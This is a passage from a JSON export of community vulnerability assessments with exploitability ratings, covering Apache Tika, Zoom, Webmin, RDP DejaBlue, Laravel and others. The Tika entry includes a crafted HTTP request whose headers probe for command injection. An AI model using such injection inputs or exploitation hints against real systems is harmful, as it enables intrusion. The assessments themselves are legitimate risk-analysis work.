config) {\r\n        String tesseract = config.getTesseractPath() + getTesseractProg();\r\n        if (TESSERACT_PRESENT.containsKey(tesseract)) {\r\n            return (Boolean)TESSERACT_PRESENT.get(tesseract);\r\n        } else {\r\n            String[] checkCmd = new String[]{tesseract};\r\n            boolean hasTesseract = ExternalParser.check(checkCmd, new int[0]);\r\n            TESSERACT_PRESENT.put(tesseract, hasTesseract);\r\n            return hasTesseract;\r\n        }\r\n    }\r\n```\r\n\r\nThe `tesseract` variable is set by concatinating `config.getTesseractPath()`, which returns a string specified in the `X-Tika-OCRTesseractPath` request header, and `getTesseractProg()`, which returns the string `tesseract` on Linux hosts. The application then checks if the value of the `tesseract` variable has been checked before and returns `true` or `false` based on the past results. If the `tesseract` string has not been checked previously then `ExternalParser.check` is called.\r\n\r\n```java\r\n    public static boolean check(String[] checkCmd, int... errorValue) {\r\n        if (errorValue.length == 0) {\r\n            errorValue = new int[]{127};\r\n        }\r\n\r\n        try {\r\n            Process process = Runtime.getRuntime().exec(checkCmd);\r\n            Thread stdErrSuckerThread = ignoreStream(process.getErrorStream(), false);\r\n            Thread stdOutSuckerThread = ignoreStream(process.getInputStream(), false);\r\n            stdErrSuckerThread.join();\r\n            stdOutSuckerThread.join();\r\n            int result = process.waitFor();\r\n            int[] var6 = errorValue;\r\n            int var7 = errorValue.length;\r\n\r\n            for(int var8 = 0; var8 < var7; ++var8) {\r\n                int err = var6[var8];\r\n                if (result == err) {\r\n                    return false;\r\n                }\r\n            }\r\n\r\n            return true;\r\n        } catch (IOException var10) {\r\n            return false;\r\n        } catch (InterruptedException var11) {\r\n            return false;\r\n        } catch (SecurityException var12) {\r\n            return false;\r\n        } catch (Error var13) {\r\n            if (var13.getMessage() == null || !var13.getMessage().contains(\"posix_spawn\") && !var13.getMessage().contains(\"UNIXProcess\")) {\r\n                throw var13;\r\n            } else {\r\n                return false;\r\n            }\r\n        }\r\n    }\r\n```\r\n\r\n`Runtime.getRuntime().exec` executes with `checkCmd`, which is the concatenated string from the `hasTesseract` method. If the Runtime exec call succeeds, and the error check is passed, then `true` is returned. During testing of Apache Tika on a Linux host the `Runtime.getRuntime().exec` call was throwing an error. Different escaping of the user-controlled request header value was not successful on Linux. `strace` was used to determine the operating system call used by Runtime exec to execute `checkCmd`.\r\n\r\n```\r\nstrace -f -p <java-pid>\r\n...\r\n[pid  4940] close(35)                   = 0\r\n[pid  4940] getdents(4, /* 0 entries */, 32768) = 0\r\n[pid  4940] close(4)                    = 0\r\n[pid  4940] fcntl(3, F_SETFD, FD_CLOEXEC) = 0\r\n[pid  4940] execve(\"/usr/local/sbin/blahhhhtesseract\", [\"blahhhhtesseract\"], 0x7ffd1272ed40 /* 46 vars */) = -1 ENOENT (No such file or directory)\r\n[pid  4940] execve(\"/usr/local/bin/blahhhhtesseract\", [\"blahhhhtesseract\"], 0x7ffd1272ed40 /* 46 vars */) = -1 ENOENT (No such file or directory)\r\n[pid  4940] execve(\"/usr/sbin/blahhhhtesseract\", [\"blahhhhtesseract\"], 0x7ffd1272ed40 /* 46 vars */) = -1 ENOENT (No such file or directory)\r\n...\r\n```\r\n\r\nPartial client Request used to generate the strace output (request body is excluded):\r\n\r\n```\r\nPUT /meta HTTP/1.1\r\nHost: 172.22.222.112:9998\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\nX-Tika-OCRTesseractPath: blahhhh\r\nX-Tika-OCRLanguage: //E:Jscript\r\nExpect: 100-continue\r\nContent-type: image/jp2\r\nConnection: close\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 8086\r\n```\r\n\r\nFrom the `strace` output it is clear that the concatenated string ends up in the `filename` (first) parameter of the `execve` calls. Since the [`execve` call does not use a full shell interpreter](https://wiki.sei.cmu.edu/confluence/pages/viewpage.action?pageId=87152177), the various injection attempts failed, which causes the  `Runtime.getRuntime().exec` method to throw an error and return `false`. The `false` return value indicates that the `TesseractOCRParser` class is unable to handle the client request. Therefore the `doOCR` method that is used when exploiting the Apache Tika application on Windows to execute commands is not reached on the Linux host. If an attacker is able to upload an executable that ends with the string `tesseract` then the `Runtime.getRuntime().exec` check could return `true` and allow further processing of the request.",
      "score": 2,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 4,
        "urgent-to-patch": 4,
        "used-successfully": 4
      },
      "tags": []
    },
    {
      "id": "182c0e87-344c-472f-98b8-dd70f5120051",
      "editorId": "4bfc5cc6-c4ec-4938-8333-98ca5da110ec",
      "topicId": "1c2dab3b-a909-41a6-96a1-f6046f177589",
      "created": "2019-06-28T17:20:59.84513Z",
      "revisionDate": "2020-02-13T17:12:33.490863Z",
      "document": "Easy to exploit. Possible on Windows due to JVM using CreateProcess under the hood, but probably not possible on Linux because execve.",
      "score": 1,
      "metadata": {},
      "tags": []
    },
    {
      "id": "af113f74-f4a2-4ca4-a5c2-e62b02c9e536",
      "editorId": "38119b46-8f40-4697-9429-e6e856507248",
      "topicId": "11f4250a-1b26-4786-b12c-ebb1bee2663f",
      "created": "2019-07-09T13:21:48.141308Z",
      "revisionDate": "2020-09-07T21:35:02.520615Z",
      "document": "Potentially useful in drive-by attack scenarios but the attack does depends on a few conditions. If the user has disabled their video when joining a meeting then the webcam won't be on even if a link is clicked/followed. If the video is enabled when joining a Zoom meeting then the information disclosure would depend on what is in view of the webcam, which could potentially be nothing. A Zoom window appears when Zoom is launched so the time for capturing potentially sensitive information is limited as well (assuming someone will close a meeting that they didn't intend to join). Also, the user would have to be running the Zoom client on macOS.",
      "score": 3,
      "metadata": {
        "attacker-value": 3,
        "exploitability": 3,
        "confidence-in-ratings": 3,
        "effort-to-develop-exploit": 1
      },
      "tags": []
    },
    {
      "id": "cb47a39a-ec8a-467b-b601-56598f938dbb",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "11f4250a-1b26-4786-b12c-ebb1bee2663f",
      "created": "2019-07-09T17:19:53.261258Z",
      "revisionDate": "2020-02-13T17:12:32.856496Z",
      "document": "Possibly a source of other vulnerabilities in the internal webserver, worth a look at least to see if there is anything else that could be exploited.\r\n\r\nNote, it appears that now there are private Zoom PoC's exploiting the webserver for remote code execution, though this appears to require the user to have uninstalled Zoom first leaving the web server behind. This is likely due to something in the clawback reinstaller not validating or accepting an attacker-controlled resource for the installer binaries.",
      "score": 6,
      "metadata": {
        "attacker-value": 2,
        "exploitability": 3,
        "urgent-to-patch": 3,
        "used-successfully": 5,
        "effort-to-develop-exploit": 1
      },
      "tags": []
    },
    {
      "id": "f68daf50-1a10-41b9-809c-5a02893497e9",
      "editorId": "ba7d1514-7156-496b-8642-ed75d18e5d9b",
      "topicId": "545b5e8f-cb7e-4356-8b5d-a2118668272a",
      "created": "2019-07-09T17:54:14.690479Z",
      "revisionDate": "2020-02-13T17:12:32.64128Z",
      "document": "This is a memory corruption vulnerability that allows an attacker to send a malformed HTTPS packet, which will then generate the corruption. At this time, there are no reports that the memory corruption will result in remote code execution, just a Denial of Service.\r\n\r\nThese switches are not Cisco\u2019s flagship products, so distribution will be limited, though that also means they are likely to be in locations without robust IT support, and upgrading the software on a core switch can be daunting and may have unanticipated consequences to the configuration, especially for novices.\r\n\r\nWhile the surface area for attack is limited, this will likely retain a longer shelf life. It requires that HTTPS be enabled on the switch, which should be done to prevent eavesdropping, anyway.\r\n\r\nMitigations are fairly straight-forward; it is not a great practice to allow access to critical infrastructure configuration ports from untrusted areas, you should not disable the HTTPS connections, and there is a patch available from Cisco.",
      "score": 1,
      "metadata": {
        "attacker-value": 1,
        "exploitability": 3,
        "urgent-to-patch": 2,
        "used-successfully": 1,
        "confidence-in-ratings": 4,
        "effort-to-develop-exploit": 2
      },
      "tags": []
    },
    {
      "id": "e0fb256f-11e2-4eaf-8a76-8f5b5d5eeb52",
      "editorId": "ba7d1514-7156-496b-8642-ed75d18e5d9b",
      "topicId": "fcd6bd45-ab66-4764-aff8-e1adcdc65e40",
      "created": "2019-07-10T13:02:42.878245Z",
      "revisionDate": "2020-04-28T21:38:01.479973Z",
      "document": "This is a priv esc being used in the wild.  It targets older versions of Windows, with part of the path to execution stopped in recent Workstation OS internal changes.  If you are running the affected OS, you should patch and think about upgrading the OS to something released in the last decade.",
      "score": 3,
      "metadata": {
        "attacker-value": 3,
        "exploitability": 2,
        "urgent-to-patch": 4,
        "used-successfully": 1,
        "confidence-in-ratings": 3,
        "effort-to-develop-exploit": 4
      },
      "tags": []
    },
    {
      "id": "2dd028ee-0489-4290-84c0-34e3b18e54c1",
      "editorId": "ba7d1514-7156-496b-8642-ed75d18e5d9b",
      "topicId": "84538e82-69bd-4e8e-97de-bb0c4844b558",
      "created": "2019-07-10T15:11:00.242146Z",
      "revisionDate": "2020-02-13T17:12:32.248125Z",
      "document": "This is very hard to quantify in any way given the lack of reporting on the internal workings.  It is a Priv Esc that affects all recent versions of Windows, though, so it would be a concern.  I have seen no PoC for it, though it was used in the wild.",
      "score": 2,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 3,
        "urgent-to-patch": 4,
        "used-successfully": 1,
        "confidence-in-ratings": 1,
        "effort-to-develop-exploit": 3
      },
      "tags": []
    },
    {
      "id": "f743e14e-61d6-4f23-b273-fa890e57c8f0",
      "editorId": "e426cc12-067c-41a8-83c0-029757da0dbf",
      "topicId": "3ba931b8-db42-4af0-bc61-e13ee6d69ab6",
      "created": "2019-07-12T14:39:19.239866Z",
      "revisionDate": "2020-02-13T17:12:32.015255Z",
      "document": "This vulnerability allows for taking over SYSTEM-owned files. Getting an elevated shell takes more effort, either by exposing the DiagHub service, which will willingly load a file from System32 with SYSTEM privileges or by combing the target for a service that loads a dll as SYSTEM. Exploitability is variable due to those reasons, but ultimately this is a useful vulnerability. Effort to execute this exploit is rated higher due to shell access being a prerequisite.\r\n\r\nThere is even a bypass for this vulnerability's patch: CVE-2019-1064.",
      "score": 2,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 2,
        "urgent-to-patch": 5,
        "used-successfully": 5,
        "confidence-in-ratings": 3,
        "effort-to-develop-exploit": 4
      },
      "tags": []
    },
    {
      "id": "43f8e7ea-f1dd-435e-819f-146495fb5f4f",
      "editorId": "38119b46-8f40-4697-9429-e6e856507248",
      "topicId": "b9816cf3-ac8b-49a8-b1b9-895bb26a15d7",
      "created": "2019-07-12T17:33:37.549498Z",
      "revisionDate": "2020-04-28T21:38:41.286098Z",
      "document": "The exploit depends on having a valid APP_KEY for the application. If the target Laravel Framework is vulnerable to CVE-2017-16894, then it would be possible to obtain the APP_KEY as an unauthenticated user. Also, if the environment has APP_DEBUG enabled, then it may be possible to retrieve the APP_KEY from error messages generated by Laravel Framework.\r\nFrom Google searches, there appears to be several hosts that leak their APP_KEY.",
      "score": 0,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 5,
        "urgent-to-patch": 5,
        "used-successfully": 5,
        "confidence-in-ratings": 3,
        "effort-to-develop-exploit": 3
      },
      "tags": []
    },
    {
      "id": "3d2aee37-b6d4-4d12-83bf-4d4cfe01a086",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "b983621d-529b-4375-aa6c-0db0fbbf9a94",
      "created": "2019-07-15T17:39:18.07572Z",
      "revisionDate": "2020-02-13T17:12:31.443137Z",
      "document": "#### Assessment\r\n\r\nI think I would see this in the real world, exploitation is trivial, and attacking an SSO system could be valuable.\r\n\r\n#### Additional analysis\r\n\r\n> What would happen if I changed the `Content-Type` from `multipart/form-data` to a different `multipart` encoding? Let\u2019s try it.\r\n>\r\n> This time I decided to try uploading my malicious plugin with the Content-Type of `multipart/mixed` instead. Maybe that would work?\r\n\r\nThey didn't share how they got there, but it's an easy find with source code.\r\n\r\n```\r\nwvu@kharak:~$ cd Downloads/\r\nwvu@kharak:~/Downloads$ git clone https://bitbucket.org/atlassian/pdkinstall-plugin.git\r\nCloning into 'pdkinstall-plugin'...\r\nremote: Counting objects: 210, done.\r\nremote: Compressing objects: 100% (115/115), done.\r\nremote: Total 210 (delta 88), reused 138 (delta 56)\r\nReceiving objects: 100% (210/210), 26.20 KiB | 813.00 KiB/s, done.\r\nResolving deltas: 100% (88/88), done.\r\nwvu@kharak:~/Downloads$ cd pdkinstall-plugin/\r\nwvu@kharak:~/Downloads/pdkinstall-plugin:master$ git grep isMultipart\r\nsrc/main/java/com/atlassian/pdkinstall/PdkInstallFilter.java:        boolean isMultipart = ServletFileUpload.isMultipartContent(req);\r\nsrc/main/java/com/atlassian/pdkinstall/PdkInstallFilter.java:        if (isMultipart)\r\nwvu@kharak:~/Downloads/pdkinstall-plugin:master$ git grep ServletFileUpload\r\nsrc/main/java/com/atlassian/pdkinstall/PdkInstallFilter.java:import org.apache.commons.fileupload.servlet.ServletFileUpload;\r\nsrc/main/java/com/atlassian/pdkinstall/PdkInstallFilter.java:        boolean isMultipart = ServletFileUpload.isMultipartContent(req);\r\nsrc/main/java/com/atlassian/pdkinstall/PdkInstallFilter.java:        ServletFileUpload upload = new ServletFileUpload(factory);\r\nwvu@kharak:~/Downloads/pdkinstall-plugin:master$\r\n```\r\n\r\nhttps://commons.apache.org/proper/commons-fileupload/apidocs/org/apache/commons/fileupload/servlet/ServletFileUpload.html\r\n\r\n> This class handles multiple files per single HTML widget, sent using `multipart/mixed` encoding type, as specified by [RFC 1867](http://www.ietf.org/rfc/rfc1867.txt).",
      "score": 1,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 5,
        "urgent-to-patch": 4,
        "used-successfully": 1,
        "confidence-in-ratings": 4,
        "effort-to-develop-exploit": 1
      },
      "tags": []
    },
    {
      "id": "e09b4f3b-7dbe-4bdc-b8ff-7418df45323d",
      "editorId": "ba7d1514-7156-496b-8642-ed75d18e5d9b",
      "topicId": "e11b2279-bc7d-45cc-b53e-5009e831c4f0",
      "created": "2019-07-18T21:47:47.424407Z",
      "revisionDate": "2020-02-13T17:12:31.237031Z",
      "document": "As exploits go, being able to serve payloads to all Dell computers in a subnet us a pretty useful tool.  It would require DNS hijacking and other noisy things, but not everyone is checking networks for those attacks, and if they are, they might be doing it on a Dell.",
      "score": 2,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 3,
        "urgent-to-patch": 5,
        "used-successfully": 1,
        "confidence-in-ratings": 4,
        "effort-to-develop-exploit": 3
      },
      "tags": []
    },
    {
      "id": "ed3ad8fb-5b0d-4529-95f4-ea68a376885c",
      "editorId": "e426cc12-067c-41a8-83c0-029757da0dbf",
      "topicId": "ef403433-4978-4777-ad11-18e1f345dd4f",
      "created": "2019-07-24T17:33:32.347265Z",
      "revisionDate": "2020-07-10T13:27:51.178222Z",
      "document": " ",
      "score": 2,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 3,
        "urgent-to-patch": 4,
        "used-successfully": 1,
        "confidence-in-ratings": 2,
        "effort-to-develop-exploit": 3
      },
      "tags": []
    },
    {
      "id": "c80dab7a-b5b0-4bce-8104-b9e85d23910d",
      "editorId": "be56a709-ab70-4e82-8afc-87943f13dfe4",
      "topicId": "e11b2279-bc7d-45cc-b53e-5009e831c4f0",
      "created": "2019-07-24T18:43:28.05485Z",
      "revisionDate": "2020-02-13T17:12:30.841338Z",
      "document": "While the author specifically lists ARP spoofing and DNS hijacking as necessary, I suspect ARP spoofing is not a needed step and DNS cache poisoning may also work to turn this into a remote, site-wide attack.\r\n\r\nPerhaps more interesting is that it's unstated (in both the blog post and the Dell advisory) whether this software supports auto-update, and it seems like Dell would have mentioned it if it did.  Instead, Dell points to a manual EXE-based installer.  The software only runs on Dell and AlienWare hardware, so I wasn't able (or willing to be persistent enough) to get it to run in a VM.",
      "score": 2,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 4,
        "urgent-to-patch": 4,
        "used-successfully": 1,
        "confidence-in-ratings": 5,
        "effort-to-develop-exploit": 1
      },
      "tags": []
    },
    {
      "id": "76dfff78-22b8-4567-b654-5971fa427ece",
      "editorId": "be56a709-ab70-4e82-8afc-87943f13dfe4",
      "topicId": "d266a303-fb62-49d5-8159-447a22b37fff",
      "created": "2019-07-24T18:59:49.39961Z",
      "revisionDate": "2020-02-13T17:12:30.648306Z",
      "document": "Given Firefox's strong-armed autoupdater, it would be unlikely that a client workstation is still exploitable.  However, the vulnerability reaches way back (into 2015), meaning kiosks and embedded devices are likely another story, especially if they're using read-only storage to boot each time.  These devices would likely be publicly-accessible and network-connected, but would require an attacker to be physically present or to gain control of the resource that the organization configures the kiosk to use.",
      "score": 1,
      "metadata": {
        "attacker-value": 2,
        "exploitability": 4,
        "urgent-to-patch": 5,
        "used-successfully": 1,
        "confidence-in-ratings": 3,
        "effort-to-develop-exploit": 3
      },
      "tags": []
    },
    {
      "id": "13133ca0-93a9-4b5f-93a8-44fcc69d18f6",
      "editorId": "be56a709-ab70-4e82-8afc-87943f13dfe4",
      "topicId": "84538e82-69bd-4e8e-97de-bb0c4844b558",
      "created": "2019-07-24T19:06:37.295491Z",
      "revisionDate": "2020-02-13T17:12:30.451696Z",
      "document": "I'm seeing that it's Windows Server versions 2012 though 2019, and that 2008 isn't affected.  But it's been a few weeks and all we have to go off of is still the Microsoft advisory.  That said, as Brian Krebs pointed out, this is the fifth vuln we've seen in Microsoft's DHCP handling code, which would be super interesting given the broadcast nature of the protocol and the lack of logging and monitoring associated with DHCP broadcasts.",
      "score": 2,
      "metadata": {
        "attacker-value": 2,
        "urgent-to-patch": 5,
        "used-successfully": 1,
        "confidence-in-ratings": 3
      },
      "tags": []
    },
    {
      "id": "37b11c24-0469-4873-b98b-d78c1b3db6a4",
      "editorId": "be56a709-ab70-4e82-8afc-87943f13dfe4",
      "topicId": "75d27812-f60e-4f57-a96a-929bbc231185",
      "created": "2019-07-24T20:09:07.525941Z",
      "revisionDate": "2020-02-13T17:12:30.254625Z",
      "document": "It's terrifying that this certificate supports all issuance and application policies.  Reddit users have proven that this can be used to MitM HTTPS-encrypted web browsing, as well as to sign code.  It's unclear as to whether the certificate is unique to each install (which would turn this into maybe a local privesc, or whether the certificate is shared across all installs, at which point this becomes a threat to any Dell user on a compromised network.\r\n\r\nIt's also worth pointing out that some users didn't have the certificate described, but then had it added later after running updates.  So sysadmins might have checked for this, but then had their workstations put into a vulnerable state afterwards.",
      "score": 1,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 3,
        "urgent-to-patch": 5,
        "used-successfully": 1,
        "confidence-in-ratings": 4,
        "effort-to-develop-exploit": 2
      },
      "tags": []
    },
    {
      "id": "fefa39d0-1848-46a3-b924-b43bece29d1b",
      "editorId": "be56a709-ab70-4e82-8afc-87943f13dfe4",
      "topicId": "a29f033f-47f8-4658-b470-4a3f541e9175",
      "created": "2019-07-24T20:37:14.08226Z",
      "revisionDate": "2020-04-28T21:34:02.043826Z",
      "document": "We still haven't seen a PoC for this, likely because these switches are expensive and the firmware is paywalled.  Further, the advisory returns a 503 right now, so here's the archive.org link: https://web.archive.org/web/20190521004255/https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190501-nexus9k-sshkey\r\n\r\nIt's interesting that this needs to be exploited over IPv6.  However, it's likely that a foothold in the target network or a tunnel through a compromised machine would allow access to this switch.  These switches are used as part of SDN-based datacenters, so getting a foothold on a compromised server might allow an attacker to pivot to another subnet, VLAN, or cloud.",
      "score": 0,
      "metadata": {},
      "tags": []
    },
    {
      "id": "967d7d2e-84a0-4f32-b692-aa00195dc0a4",
      "editorId": "be56a709-ab70-4e82-8afc-87943f13dfe4",
      "topicId": "ef403433-4978-4777-ad11-18e1f345dd4f",
      "created": "2019-07-24T20:51:20.500222Z",
      "revisionDate": "2020-04-28T21:34:04.940307Z",
      "document": "This is a very well-written research paper, with lots of artifacts and a Github-hosted PoC.  As privesc's go, this looks pretty reliable.  Since I'm not seeing any publications from Comodo yet, this may still be useful in the wild.",
      "score": 0,
      "metadata": {
        "attacker-value": 3,
        "exploitability": 4,
        "urgent-to-patch": 5,
        "used-successfully": 1,
        "confidence-in-ratings": 4,
        "effort-to-develop-exploit": 2
      },
      "tags": []
    },
    {
      "id": "7c9a4d52-9b22-4a97-a84e-d3ff8c9fa2e6",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "32e971ab-bd27-482b-a0d5-b6aa4cbe4220",
      "created": "2019-07-24T21:25:09.159151Z",
      "revisionDate": "2020-02-13T17:12:29.62672Z",
      "document": "This looks like it will be a useful vuln for a while, and probably more related things to find in custom SSL VPN stacks.",
      "score": 1,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 3,
        "urgent-to-patch": 5,
        "used-successfully": 1,
        "confidence-in-ratings": 3,
        "effort-to-develop-exploit": 3
      },
      "tags": []
    },
    {
      "id": "6e63882a-904e-4b40-84e2-d14e6fd4b3ee",
      "editorId": "6d00a11d-d7a6-4e98-a7ed-834b16d67594",
      "topicId": "b30dba02-6e48-4e72-8807-ed98c0ae8c2d",
      "created": "2019-07-30T15:34:35.155278Z",
      "revisionDate": "2020-02-13T17:12:29.421513Z",
      "document": "I think this vuln is very dangerous",
      "score": 1,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5,
        "urgent-to-patch": 5,
        "confidence-in-ratings": 1,
        "effort-to-develop-exploit": 5
      },
      "tags": []
    },
    {
      "id": "c15dba18-b61d-4272-b44b-a6935ca5a6f5",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "3c6d4a84-b8ee-47a2-a1e9-388f5f32ad27",
      "created": "2019-08-13T17:48:20.669307Z",
      "revisionDate": "2020-02-21T17:46:59.052995Z",
      "document": "Affects every version of Windows from Windows 7 to Windows 10.  A DVC, or Dynamic Virtual Channel, packet needs to be sent with a specially-crafted uncompressed field field value larger than an integer, causing an overflow, according to MalwareTech's writeup here: https://www.malwaretech.com/2019/08/dejablue-analyzing-a-rdp-heap-overflow.html",
      "score": 4,
      "metadata": {
        "attacker-value": 5,
        "urgent-to-patch": 5,
        "used-successfully": 1,
        "confidence-in-ratings": 4
      },
      "tags": []
    },
    {
      "id": "abf1ee6f-9539-4cc6-b2a3-3f9ce8d8c145",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "b983621d-529b-4375-aa6c-0db0fbbf9a94",
      "created": "2019-08-13T18:10:18.673919Z",
      "revisionDate": "2020-02-13T17:12:29.027948Z",
      "document": "Looks like a good source of additional data for further exploitation.",
      "score": 1,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5,
        "used-successfully": 1,
        "effort-to-develop-exploit": 1
      },
      "tags": []
    },
    {
      "id": "df74dac8-0985-4f21-b377-8233ab696eae",
      "editorId": "e426cc12-067c-41a8-83c0-029757da0dbf",
      "topicId": "3c6d4a84-b8ee-47a2-a1e9-388f5f32ad27",
      "created": "2019-08-19T19:17:04.291348Z",
      "revisionDate": "2020-02-21T17:47:05.10456Z",
      "document": " ",
      "score": 3,
      "metadata": {
        "attacker-value": 5,
        "urgent-to-patch": 5,
        "used-successfully": 1,
        "confidence-in-ratings": 3
      },
      "tags": []
    },
    {
      "id": "51e9af72-003f-4e05-a8a3-2a53c8a8da27",
      "editorId": "38119b46-8f40-4697-9429-e6e856507248",
      "topicId": "ea90a258-8e7f-49cd-a730-6d8457a421d7",
      "created": "2019-08-20T18:02:54.508118Z",
      "revisionDate": "2020-04-28T21:38:36.664504Z",
      "document": "I tested Webmin v1.900 and the password change page was not available by default, however it is a reasonable option to have.\r\nA valid username is not needed for the exploit, although the command injection did not work for me when I used the valid username `root`.",
      "score": 2,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5,
        "urgent-to-patch": 5,
        "used-successfully": 5,
        "confidence-in-ratings": 5,
        "effort-to-develop-exploit": 1
      },
      "tags": []
    },
    {
      "id": "b13d216f-2a27-41b0-b1c2-5048e98bdedc",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "ea90a258-8e7f-49cd-a730-6d8457a421d7",
      "created": "2019-08-20T18:37:53.714695Z",
      "revisionDate": "2020-08-03T21:30:19.109713Z",
      "document": "This is bound to have many vulnerable installations that may persist for some time, since webmin tends to be used by novice admins.",
      "score": 5,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5,
        "urgent-to-patch": 5,
        "used-successfully": 1,
        "confidence-in-ratings": 5,
        "effort-to-develop-exploit": 1
      },
      "tags": []
    },
    {
      "id": "4601b37d-1e68-494e-be8b-c45be7ad424c",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "ea90a258-8e7f-49cd-a730-6d8457a421d7",
      "created": "2019-08-21T03:12:09.798196Z",
      "revisionDate": "2024-01-08T08:13:39.033094Z",
      "document": "This was a supply chain attack: http://www.webmin.com/exploit.html. The backdoor was introduced in a version that was \"exploitable\" in the default install. Version 1.890 is the money. Anything after requires a non-default setting.\r\n\r\nNote that SourceForge installs are affected, but GitHub checkouts aren't.\r\n\r\nETA: Metasploit added an [exploit module](https://github.com/rapid7/metasploit-framework/pull/12219).",
      "score": 15,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5,
        "urgent-to-patch": 5,
        "used-successfully": 5,
        "confidence-in-ratings": 5,
        "effort-to-develop-exploit": 1
      },
      "tags": []
    },
    {
      "id": "81ae9e60-7057-4880-8bca-c9b493ee32e1",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "7962c6db-020f-496c-9ead-77f2fb991724",
      "created": "2019-08-21T16:31:24.176821Z",
      "revisionDate": "2020-04-26T23:02:11.020714Z",
      "document": "A SOP bug requires the attacker to inject a resource into one domain, and be listening on another. Such a vulnerability would need to be combined with a web application vulnerability like XSS, and would be less useful from a standalone PoV as something like a Metasploit module. But with the right target audience and web application, this is a nice primitive.",
      "score": 4,
      "metadata": {
        "attacker-value": 3,
        "exploitability": 4,
        "urgent-to-patch": 3,
        "used-successfully": 5,
        "confidence-in-ratings": 3,
        "effort-to-develop-exploit": 1
      },
      "tags": []
    },
    {
      "id": "d653ceea-6bd9-47b2-b253-884207a33525",
      "editorId": "ba7d1514-7156-496b-8642-ed75d18e5d9b",
      "topicId": "3c6d4a84-b8ee-47a2-a1e9-388f5f32ad27",
      "created": "2019-08-22T22:14:31.960792Z",
      "revisionDate": "2020-02-21T17:47:00.736404Z",
      "document": "This vulnerability was discovered while researchers audited the RDP code from the previous vulnerability, Bluekeep.  This vulnerability is likely going to be worse than Bluekeep, as it targets more modern operating systems.  The saving grace with Dejablue, as with Bluekeep and even Eternalblue is the complexity of turning the vulnerability into a reliable exploit, as the attacker must successfully trigger the vulnerability, write to kernel memory and to user memory, then execute the code in kernel memory to locate and execute the code in user memory.  Without question this is in the ability of nation states and probably even organized crime, but until a public version is released, this will be treated as a zero day by those attackers that posses it.  I would be surprised to see a public version of this that works reliably across Windows kernel 10 releases for at least another six to eight weeks (October 2019).",
      "score": 4,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 2,
        "urgent-to-patch": 5,
        "used-successfully": 1,
        "confidence-in-ratings": 4,
        "effort-to-develop-exploit": 5
      },
      "tags": []
    },
    {
      "id": "aed990bb-8f2e-4a05-a7f9-bb2f81e5d94c",
      "editorId": "ba7d1514-7156-496b-8642-ed75d18e5d9b",
      "topicId": "ea90a258-8e7f-49cd-a730-6d8457a421d7",
      "created": "2019-08-22T22:22:18.978998Z",
      "revisionDate": "2020-02-13T17:12:27.614881Z",
      "document": "This is a terrible situation for any development team.  A hacker took over a server that managed webmin code and changed the code in a subtle way to allow them (or others) to execute commands as root on computers running Webmin.  It took nearly a year and a half for the attack to be discovered and fixed.",
      "score": 3,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5,
        "urgent-to-patch": 5,
        "used-successfully": 1,
        "confidence-in-ratings": 4,
        "effort-to-develop-exploit": 1
      },
      "tags": []
    },
    {
      "id": "4719241d-900f-46d2-97f5-33affa30514f",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "3c6d4a84-b8ee-47a2-a1e9-388f5f32ad27",
      "created": "2019-08-22T22:37:50.273178Z",
      "revisionDate": "2020-03-12T19:30:28.335987Z",
      "document": " ",
      "score": 3,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 2,
        "urgent-to-patch": 5,
        "used-successfully": 1,
        "confidence-in-ratings": 3,
        "effort-to-develop-exploit": 4
      },
      "tags": []
    },
    {
      "id": "7e0dad7b-b6e2-4019-ada9-71c17fb11b4e",
      "editorId": "2cf32c54-5a35-405c-b839-6615b57b92d8",
      "topicId": "ea90a258-8e7f-49cd-a730-6d8457a421d7",
      "created": "2019-08-26T16:31:35.247246Z",
      "revisionDate": "2020-02-13T17:12:27.222151Z",
      "document": " ",
      "score": 2,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5,
        "urgent-to-patch": 5,
        "confidence-in-ratings": 4,
        "effort-to-develop-exploit": 3
      },
      "tags": []
    },
    {
      "id": "ba615d8c-df5c-486d-8bd5-7bdf424dcd6f",
      "editorId": "2cf32c54-5a35-405c-b839-6615b57b92d8",
      "topicId": "3c6d4a84-b8ee-47a2-a1e9-388f5f32ad27",
      "created": "2019-08-26T16:32:54.698225Z",
      "revisionDate": "2020-02-21T17:47:03.323926Z",
      "document": " ",
      "score": 4,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5,
        "urgent-to-patch": 5,
        "confidence-in-ratings": 3,
        "effort-to-develop-exploit": 2
      },
      "tags": []
    },
    {
      "id": "40bd79b4-dbd0-4932-93ba-b41b5f43ff26",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "131226a6-a1e9-48a1-a5d0-ac94baf8dfd2",
      "created": "2019-08-28T00:35:56.387376Z",
